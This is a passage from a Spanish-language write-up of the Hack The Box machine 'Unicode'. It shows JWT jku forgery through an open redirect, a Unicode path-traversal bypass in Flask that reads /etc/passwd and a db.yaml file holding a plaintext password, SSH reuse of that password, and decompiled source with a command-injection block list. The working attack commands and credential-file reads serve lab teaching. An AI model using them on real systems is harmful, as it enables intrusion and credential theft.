[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTcuNDQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.cWE5m9Vb9f7PoReY7XjyfRhU-Jrv23yw8C3uum8mVezJCFPeLEBbf030EXrprcGjZjzH4x_I8P9v7NNjAHiVG8bm0JG7BEyE4wjUhtNVTnoiaHnpmbIxvZkZ4UIVmdO4rvVOQYCjIgD4gcoMi2dWF6Az1EbKI1pqJKZypxU4MwM  
</code></pre></div><p>Y verificamos el <em>token</em> JWT:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> hackmedia.htb/dashboard/ -H <span class=code-dark-yellow>'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTcuNDQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.cWE5m9Vb9f7PoReY7XjyfRhU-Jrv23yw8C3uum8mVezJCFPeLEBbf030EXrprcGjZjzH4x_I8P9v7NNjAHiVG8bm0JG7BEyE4wjUhtNVTnoiaHnpmbIxvZkZ4UIVmdO4rvVOQYCjIgD4gcoMi2dWF6Az1EbKI1pqJKZypxU4MwM'</span>  
jku validation failed
</code></pre></div><p>Y todavía sigue siendo inválido (y no se recibe petición). Vamos a comparar el valor legítimo de <code>jku</code> con el que estamos usando:</p><ul><li><code>http://hackmedia.htb/static/jwks.json</code>: Válido</li><li><code>http://hackmedia.htb/redirect/?url=10.10.17.44/jwks.json</code>: Inválid0</li></ul><p>Existe una opción más, y es usando una navegación de directorios para que el campo <code>jku</code> empiece por <code>http://hackmedia.htb/static/</code> y acceder a <code>/redirect/</code>. Esto se refleja en la siguiente URL:</p><ul><li><code>http://hackmedia.htb/static/jwks.json</code>: Valid</li><li><code>http://hackmedia.htb/static/../redirect/?url=10.10.17.44/jwks.json</code>: To try</li></ul><p>Entonces, vamos a cambiar el <code>jku</code> en el <em>script</em> otra vez:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>+ jku = f'http://hackmedia.htb/static/../redirect?url={ip}/jwks.json'</span>  
<span class=mtk5>- jku = f'http://hackmedia.htb/redirect?url={ip}/jwks.json'</span>
</code></pre></div><p>Ejecutamos otra vez el <em>script</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>jwks.py</span> 10.10.17.44
[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  
</code></pre></div><p>Y ya no hay mensaje de error:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> hackmedia.htb/dashboard/ -H <span class=code-dark-yellow>'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s'</span>  
&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;!-- ... --&gt;
&lt;/html&gt;
</code></pre></div><p>Por tanto, tenemos un <em>token</em> JWT falso que a ojos del servidor es válido. Además, tenemos una petición en el registro de nuestro servidor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>jwks.py</span> 10.10.17.44
[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  
10.10.11.126 - - [] "GET /jwks.json HTTP/1.1" 200 -
</code></pre></div><p>Ahora podemos crear un <em>token</em> JWT falso para el usuario <code>admin</code>. Y esto nos lleva a un <em>dashboard</em> diferente:</p><p><img src=/images/HTB/Unicode/Unicode-admin-dashboard.png alt="Unicode admin dashboard"></p><p>Nótese que el servidor de Python tiene que seguir en ejecución para que el archivo <code>jwks.json</code> esté accesible y que la máquina pueda validar el <em>token</em> JWT.</p><h2 id=explotación-de-_directory-path-traversal_>Explotación de <em>Directory Path Traversal</em></h2><p>En este <em>dashboard</em> vemos una función para descargar archivos PDF (aunque parece que no está terminada):</p><p><img src=/images/HTB/Unicode/Unicode-dpt.png alt="Unicode PDF"></p><p>Los archivos válidos son: <code>monthly.pdf</code> y <code>quarterly.pdf</code>.</p><p>En este punto, podemos tratar un <em>payload</em> típico de <em>Directory Path Traversal</em> para ver si el servidor es vulnerable (esto es, usar múltiples <code>../</code> y luego un archivo como <code>/etc/passwd</code>):</p><p><img src=/images/HTB/Unicode/Unicode-dpt-error.png alt="Unicode DPT error"></p><p>Como se puede ver, el servidor bloquea nuestra petición. Y también dice que aplica algunos filtros, desafiándonos a burlarlos.</p><p>Después de probar <em>payloads</em> de <a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion>HackTricks</a> y <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal>PayloadsAllTheThings</a> sin resultados interesantes, podemos pensar en caracteres UTF-8 (ya que la máquina se llama Unicode).</p><p>De hecho, existe una técnica de <em>bypassing</em> en Flask que utiliza un solo carácter Unicode que visualmente se parece a <code>..</code> o <code>/</code> (por ejemplo: <code>‥</code>, <code>︰</code> or <code>／</code>), y Flask los interpreta como dos puntos y una barra. Más información <a href=https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html>aquí</a>.</p><p>Podemos verificar fácilmente que el servidor está corriendo Flask mirando el mensaje de estado de la respuesta HTTP. Si está en letras mayúsculas, es probable que estemos ante una aplicación Flask:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> hackmedia.htb -I
HTTP/1.1 308 PERMANENT REDIRECT
<span class=code-white>Server</span>: nginx/1.18.0 (Ubuntu)
<span class=code-white>Date</span>:
<span class=code-white>Content-Type</span>: text/html; charset=utf-8  
<span class=code-white>Content-Length</span>: 260
<span class=code-white>Connection</span>: keep-alive
<span class=code-white>Location</span>: http://hackmedia.htb/login/
</code></pre></div><p>Ahora que sabemos que la aplicación es Flask, podemos usar los caracteres Unicode de antes para obtener <code>/etc/passwd</code>:</p><p><img src=/images/HTB/Unicode/Unicode-dpt1.png alt="Unicode DPT /etc/passwd"></p><p><img src=/images/HTB/Unicode/Unicode-dpt2.png alt="Unicode DPT /etc/passwd"></p><p><img src=/images/HTB/Unicode/Unicode-dpt3.png alt="Unicode DPT /etc/passwd"></p><p>La página web es vulnerable a <em>Directory Path Traversal</em>. Decidí añadir este <em>exploit</em> al <em>script</em> de Python anterior (con los caracteres Unicode). El <em>script</em> es<a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Unicode/dpt-jwks.py>dpt-jwks.py</a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Unicode#dpt-jwkspy>aquí</a>).</p><p>Con este <em>script</em>, podemos leer archivos del servidor de manera sencilla:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>dpt-jwks.py</span> 10.10.17.44
[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  
[+] Vulnerable page: http://hackmedia.htb/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd

dpt&gt; /etc/hosts

127.0.0.1 localhost
127.0.1.1 code
127.0.0.1 hackmedia.htb
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div><p>Como el servidor usa nginx (mostrado en la salida de <code>nmap</code>), podemos tratar de ver la configuración de los sitios web:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dpt&gt; /etc/nginx/sites-enabled/default  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk7>limit_req_zone</span> <span class=mtk4>$binary_remote_addr</span> zone=mylimit:<span class=mtk6>10m</span> rate=800r/s;  

<span class=mtk5>server</span>{
<span class=mtk3># Change the Webroot from /home/code/app/ to /var/www/html/</span>
<span class=mtk3># Change the user password from db.yaml</span>
        <span class=mtk7>listen</span> <span class=mtk6>80</span>;
        <span class=mtk7>error_page</span> <span class=mtk6>503</span> /rate-limited/;
        <span class=mtk8>location</span> / {
                <span class=mtk7>limit_req</span> zone=mylimit;
                <span class=mtk7>proxy_pass</span> http://localhost:8000;
                <span class=mtk7>include</span> /etc/nginx/proxy_params;
                <span class=mtk7>proxy_redirect</span> <span class=mtk6>off</span>;
        }
        <span class=mtk8>location</span> /static/ {
                <span class=mtk7>alias</span> /home/code/coder/static/styles/;
        }
}
</code></pre></div><p>Aquí hay algunas cosas interesantes:</p><ul><li>&ldquo;<em>Change the Webroot from /home/code/app/ to /var/www/html/</em>&rdquo;</li><li>&ldquo;<em>Change the user password from db.yaml</em>&rdquo;</li></ul><p>Tenemos que encontrar la ruta absoluta al archivo <code>db.yaml</code> porque podría contener credenciales en texto claro. Con esta información, podemos probar las siguientes rutas:</p><ul><li><code>/home/code/db.yaml</code></li><li><code>/home/code/app/db.yaml</code></li><li><code>/var/www/html/db.yaml</code></li><li><code>/home/code/coder/static/styles/db.yaml</code></li><li><code>/home/code/coder/static/db.yaml</code></li><li><code>/home/code/coder/db.yaml</code></li></ul><p>Y la última es la correcta:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dpt&gt; /home/code/coder/db.yaml  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>mysql_host</span><span class=mtk1>:</span> <span class=mtk4>"localhost"</span>
<span class=mtk5>mysql_user</span><span class=mtk1>:</span> <span class=mtk4>"code"</span>
<span class=mtk5>mysql_password</span><span class=mtk1>:</span> <span class=mtk4>"B3stC0d3r2021@@!"</span>  
<span class=mtk5>mysql_db</span><span class=mtk1>:</span> <span class=mtk4>"user"</span>
</code></pre></div><p>Además, también podemos conseguir la <em>flag</em> <code>user.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>dpt&gt; /home/code/user.txt

eb2b21ad20f6b9239746d35881f4e023  
</code></pre></div><h2 id=enumeración-del-sistema>Enumeración del sistema</h2><p>La contraseña encontrada en el archivo <code>db.yaml</code> se reutiliza para SSH:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> code@10.10.11.126
code@10.10.11.126's password:  
<span class=code-green>code@code</span>:<span class=code-blue>~</span>$
</code></pre></div><p>El usuario <code>code</code> puede usar <code>sudo</code> para ejecutar <code>/usr/bin/treport</code> como <code>root</code> sin contraseña (aunque la conocemos):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
</code></pre></div><p>Este archivo es un binario compilado:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ file /usr/bin/treport
/usr/bin/treport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f6af5bc244c001328c174a6abf855d682aa7401b, for GNU/Linux 2.6.32, stripped  
</code></pre></div><p>El programa nos permite crear, leer y descargar reportes de amenazas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport  
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:
</code></pre></div><p>Si interactuamos con el programa y forzamos la salida (<code>^C</code>), veremos un <code>KeyboardInterrupt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>code@code</span>:<span class=code-blue>~</span>$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:^CTraceback (most recent call last):
  File "treport.py", line 67, in &lt;module&gt;
KeyboardInterrupt
[2177] Failed to execute script 'treport' due to unhandled exception!  
</code></pre></div><p>Esta es una excepción común en <em>scripts</em> de Python. Y esto nos dice que <code>treport</code> es un binario compilado con Python. Además, hay una referencia a un archivo <code>treport.py</code>.</p><h2 id=ingeniería-inversa-sobre-treport>Ingeniería inversa sobre <code>treport</code></h2><p>Para transferir el binario <code>treport</code> a nuestra máquina de atacante, se puede abrir un servidor web en la máquina víctima con Python y descargar el binario con <code>wget</code> o <code>curl</code>.</p><p>Para extraer el <em>byte-code</em> (<code>.pyc</code>), podemos usar <a href=https://github.com/extremecoders-re/pyinstxtractor/>PyInstaller Extractor</a>. Luego, con el <em>byte-code</em> podemos obtener el <em>script</em> de Python original con <a href=https://pypi.org/project/uncompyle6/><code>uncompyle6</code></a> (<code>pip3 install uncompyle6</code>).</p><p>Estas herramientas necesitan Python versión 3.8. Para prevenir problemas, esta tarea se puede realizar en un contenedor de Docker:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>wget</span> -q https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py  

<span class=code-cyan>$</span> <span class=code-dark-green>docker</span> run --rm -v <span class=code-dark-yellow>"<span class=code-dark-cyan>$PWD</span>"</span>/:/htb -it python:3.8 bash
root@28075f8d8030:/# cd htb
root@28075f8d8030:/htb# pip3 install uncompyle6
...
root@28075f8d8030:/htb# python3 pyinstxtractor.py treport
[+] Processing treport
[+] Pyinstaller version: 2.1+
[+] Python version: 38
[+] Length of package: 6798297 bytes
[+] Found 46 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: treport.pyc
[+] Found 223 files in PYZ archive
[+] Successfully extracted pyinstaller archive: treport

You can now use a python decompiler on the pyc files within the extracted directory
root@28075f8d8030:/htb# uncompyle6 treport_extracted/treport.pyc &gt; treport.py
</code></pre></div><p>Y ahora somos capaces de leer el código fuente en Python y analizarlo:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">os</span><span class=mtk1>,</span> <span class="mtk8 mtku">re</span><span class=mtk1>,</span> <span class="mtk8 mtku">sys</span>
<span class=mtk5>from</span> <span class="mtk8 mtku">datetime</span> <span class=mtk5>import</span> <span class="mtk8 mtku">datetime</span>

<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">threat_report</span><span class=mtk1>:</span>
    <span class="mtk7 mtki">def</span> <span class=mtk8>create</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
        <span class=mtk1>file_name</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'Enter</span> <span class=mtk4>the</span> <span class=mtk4>filename:'</span><span class=mtk1>)</span>
        <span class=mtk1>content</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'Enter</span> <span class=mtk4>the</span> <span class=mtk4>report:'</span><span class=mtk1>)</span>
        <span class=mtk5>if</span> <span class=mtk4>'../'</span> <span class=mtk5>in</span> <span class=mtk1>file_name</span><span class=mtk1>:</span>
            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'NOT</span> <span class=mtk4>ALLOWED'</span><span class=mtk1>)</span>
            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
        <span class=mtk1>file_path</span> <span class=mtk5>=</span> <span class=mtk4>'/root/reports/'</span> <span class=mtk5>+</span> <span class=mtk1>file_name</span>
        <span class=mtk5>with</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk1>file_path</span><span class=mtk1>,</span> <span class=mtk4>'w'</span><span class=mtk1>)</span> <span class=mtk5>as</span> <span class=mtk1>(</span><span class=mtk1>fd</span><span class=mtk1>):</span>
            <span class=mtk1>fd</span><span class=mtk1>.</span><span class=mtk8>write</span><span class=mtk1>(</span><span class=mtk1>content</span><span class=mtk1>)</span>

    <span class="mtk7 mtki">def</span> <span class=mtk8>list_files</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
        <span class=mtk1>file_list</span> <span class=mtk5>=</span> <span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>listdir</span><span class=mtk1>(</span><span class=mtk4>'/root/reports/'</span><span class=mtk1>)</span>
        <span class=mtk1>files_in_dir</span> <span class=mtk5>=</span> <span class=mtk4>'</span> <span class=mtk4>'</span><span class=mtk1>.</span><span class=mtk8>join</span><span class=mtk1>([</span><span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class=mtk1>elem</span><span class=mtk1>)</span> <span class=mtk5>for</span> <span class=mtk1>elem</span> <span class=mtk5>in</span> <span class=mtk1>file_list</span><span class=mtk1>])</span>
        <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'ALL</span> <span class=mtk4>THE</span> <span class=mtk4>THREAT</span> <span class=mtk4>REPORTS:'</span><span class=mtk1>)</span>
        <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk1>files_in_dir</span><span class=mtk1>)</span>

    <span class="mtk7 mtki">def</span> <span class=mtk8>read_file</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
        <span class=mtk1>file_name</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'</span><span class=mtk6>\n</span><span class=mtk4>Enter</span> <span class=mtk4>the</span> <span class=mtk4>filename:'</span><span class=mtk1>)</span>
        <span class=mtk5>if</span> <span class=mtk4>'../'</span> <span class=mtk5>in</span> <span class=mtk1>file_name</span><span class=mtk1>:</span>
            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'NOT</span> <span class=mtk4>ALLOWED'</span><span class=mtk1>)</span>
            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
        <span class=mtk1>contents</span> <span class=mtk5>=</span> <span class=mtk4>''</span>
        <span class=mtk1>file_name</span> <span class=mtk5>=</span> <span class=mtk4>'/root/reports/'</span> <span class=mtk5>+</span> <span class=mtk1>file_name</span>
        <span class=mtk5>try</span><span class=mtk1>:</span>
            <span class=mtk5>with</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk1>file_name</span><span class=mtk1>,</span> <span class=mtk4>'r'</span><span class=mtk1>)</span> <span class=mtk5>as</span> <span class=mtk1>(</span><span class=mtk1>fd</span><span class=mtk1>):</span>
                <span class=mtk1>contents</span> <span class=mtk5>=</span> <span class=mtk1>fd</span><span class=mtk1>.</span><span class=mtk8>read</span><span class=mtk1>()</span>
        <span class=mtk5>except</span><span class=mtk1>:</span>
            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'SOMETHING</span> <span class=mtk4>IS</span> <span class=mtk4>WRONG'</span><span class=mtk1>)</span>
        <span class=mtk5>else</span><span class=mtk1>:</span>
            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk1>contents</span><span class=mtk1>)</span>

    <span class="mtk7 mtki">def</span> <span class=mtk8>download</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
        <span class=mtk1>now</span> <span class=mtk5>=</span> <span class="mtk8 mtku">datetime</span><span class=mtk1>.</span><span class=mtk8>now</span><span class=mtk1>()</span>
        <span class=mtk1>current_time</span> <span class=mtk5>=</span> <span class=mtk1>now</span><span class=mtk1>.</span><span class=mtk8>strftime</span><span class=mtk1>(</span><span class=mtk4>'%H_%M_%S'</span><span class=mtk1>)</span>
        <span class=mtk1>command_injection_list</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk4>'`'</span><span class=mtk1>,</span> <span class=mtk4>';'</span><span class=mtk1>,</span> <span class=mtk4>'&amp;'</span><span class=mtk1>,</span> <span class=mtk4>'|'</span><span class=mtk1>,</span> <span class=mtk4>'&gt;'</span><span class=mtk1>,</span> <span class=mtk4>'&lt;'</span><span class=mtk1>,</span> <span class=mtk4>'?'</span><span class=mtk1>,</span> <span class=mtk4>"'"</span><span class=mtk1>,</span> <span class=mtk4>'@'</span><span class=mtk1>,</span> <span class=mtk4>'#'</span><span class=mtk1>,</span> <span class=mtk4>'$'</span><span class=mtk1>,</span> <span class=mtk4>'%'</span><span class=mtk1>,</span> <span class=mtk4>'^'</span><span class=mtk1>,</span> <span class=mtk4>'('</span><span class=mtk1>,</span> <span class=mtk4>')'</span><span class=mtk1>]</span>  
        <span class=mtk1>ip</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'Enter</span> <span class=mtk4>the</span> <span class=mtk4>IP/file_name:'</span><span class=mtk1>)</span>
        <span class=mtk1>res</span> <span class=mtk5>=</span> <span class="mtk8 mtku">bool</span><span class=mtk1>(</span><span class="mtk8 mtku">re</span><span class=mtk1>.</span><span class=mtk8>search</span><span class=mtk1>(</span><span class=mtk4>'</span><span class=mtk6>\\</span><span class=mtk4>s'</span><span class=mtk1>,</span> <span class=mtk1>ip</span><span class=mtk1>))</span>
        <span class=mtk5>if</span> <span class=mtk1>res</span><span class=mtk1>:</span>
            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'INVALID</span> <span class=mtk4>IP'</span><span class=mtk1>)</span>
            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
        <span class=mtk5>if</span> <span class=mtk4>'file'</span> <span class=mtk5>in</span> <span class=mtk1>ip</span> <span class=mtk5>or</span> <span class=mtk4>'gopher'</span> <span class=mtk5>in</span> <span class=mtk1>ip</span> <span class=mtk5>or</span> <span class=mtk4>'mysql'</span> <span class=mtk5>in</span> <span class=mtk1>ip</span><span class=mtk1>:</span>
            <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'INVALID</span> <span class=mtk4>URL'</span><span class=mtk1>)</span>
            <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
        <span class=mtk5>for</span> <span class=mtk1>vars</span> <span class=mtk5>in</span> <span class=mtk1>command_injection_list</span><span class=mtk1>:</span>
            <span class=mtk5>if</span> <span class=mtk1>vars</span> <span class=mtk5>in</span> <span class=mtk1>ip</span><span class=mtk1>:</span>
                <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'NOT</span> <span class=mtk4>ALLOWED'</span><span class=mtk1>)</span>
                <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>)</span>
            <span class=mtk1>cmd</span> <span class=mtk5>=</span> <span class=mtk4>'/bin/bash</span> <span class=mtk4>-c</span> <span class=mtk4>"curl</span> <span class=mtk4>'</span> <span class=mtk5>+</span> <span class=mtk1>ip</span> <span class=mtk5>+</span> <span class=mtk4>'</span> <span class=mtk4>-o</span> <span class=mtk4>/root/reports/threat_report_'</span> <span class=mtk5>+</span> <span class=mtk1>current_time</span> <span class=mtk5>+</span> <span class=mtk4>'"'</span>
            <span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>system</span><span class=mtk1>(</span><span class=mtk1>cmd</span><span class=mtk1>)</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk1>obj</span> <span class=mtk5>=</span> <span class="mtk8 mtku">threat_report</span><span class=mtk1>()</span>
    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'1.Create</span> <span class=mtk4>Threat</span> <span class=mtk4>Report.'</span><span class=mtk1>)</span>
    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'2.Read</span> <span class=mtk4>Threat</span> <span class=mtk4>Report.'</span><span class=mtk1>)</span>
    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'3.Download</span> <span class=mtk4>A</span> <span class=mtk4>Threat</span> <span class=mtk4>Report.'</span><span class=mtk1>)</span>
    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'4.Quit.'</span><span class=mtk1>)</span>
    <span class=mtk1>check</span> <span class=mtk5>=</span> <span class=mtk6>True</span>
    <span class=mtk5>if</span> <span class=mtk1>check</span><span class=mtk1>:</span>
        <span class=mtk1>choice</span> <span class=mtk5>=</span> <span class=mtk8>input</span><span class=mtk1>(</span><span class=mtk4>'Enter</span> <span class=mtk4>your</span> <span class=mtk4>choice:'</span><span class=mtk1>)</span>
        <span class=mtk5>try</span><span class=mtk1>:</span>
            <span class=mtk1>choice</span> <span class=mtk5>=</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>choice</span><span class=mtk1>)</span>
